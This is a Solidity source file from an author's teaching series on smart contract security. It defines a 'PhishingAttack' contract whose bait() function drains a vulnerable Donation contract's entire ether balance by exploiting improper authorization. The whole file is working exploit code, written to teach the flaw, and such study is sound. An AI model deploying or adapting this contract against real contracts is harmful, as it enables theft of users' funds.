// SPDX-License-Identifier: BSL-1.0 (Boost Software License 1.0)

//-------------------------------------------------------------------------------------//
// Copyright (c) 2022 - 2023 serial-coder: Phuwanai Thummavet (mr.thummavet@gmail.com) //
//-------------------------------------------------------------------------------------//

// For more info, please refer to my article:
//  - On Medium: https://medium.com/valixconsulting/solidity-smart-contract-security-by-example-07-phishing-with-improper-authorization-232dacf307e3
//  - On serial-coder.com: https://www.serial-coder.com/post/solidity-smart-contract-security-by-example-07-phishing-with-improper-authorization/

pragma solidity 0.8.17;

interface IDonation {
    function collectEthers(address payable _to, uint256 _amount) external;
}

contract PhishingAttack {
    IDonation public immutable donationContract;

    constructor(IDonation _donationContract) {
        donationContract = _donationContract;
    }

    receive() external payable {}

    function bait() external {
        donationContract.collectEthers(
            payable(address(this)), 
            address(donationContract).balance
        );
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}